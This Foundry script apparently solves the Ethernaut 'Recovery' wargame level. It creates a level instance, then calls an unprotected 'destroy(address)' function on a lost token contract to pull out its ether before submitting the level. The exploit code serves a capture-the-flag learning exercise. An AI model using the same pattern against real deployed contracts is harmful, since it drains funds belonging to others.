// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
//  import "../../src/17-RecoveryAttacker.sol";

contract RecoverySolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048;
    address instanceAddress = 0xdb766342603a5fB46BE96994474C1CA80BA94732; // change to your own instanceAddress
    address tokenAddress = 0xd5925AF07391D54448F91d3EdAE093CaCB5A5A40; // change to your own tokenAddress
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");


    // function run() public {
    //     vm.startBroadcast(heroPrivateKey);
    //     // NOTE this is the address of your challenge contract
    //     // NOTE Must send at least 0.001 ETH
    //     address challengeInstance = __createInstance(LEVEL_ADDRESS);
    //     // SUBMIT CHALLENGE. (DON'T EDIT)
    //     bool levelSuccess = submitInstance(challengeInstance);
    //     require(levelSuccess, "Challenge not passed yet");
    //     vm.stopBroadcast();

    //     console2.log(successMessage(17));
    // }

    function step1() public {
        vm.startBroadcast(heroPrivateKey);
        address challengeInstance = __createInstance(LEVEL_ADDRESS);
        console2.log("instance address:", challengeInstance);
        vm.stopBroadcast();
    }

    function step2() public {
        vm.startBroadcast(heroPrivateKey);

        (bool success, ) = tokenAddress.call(abi.encodeWithSignature("destroy(address)", vm.envAddress("ACCOUNT_ADDRESS")));

        require(success, "call fail");
        bool levelSuccess = submitInstance(instanceAddress);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(17));
    }
}
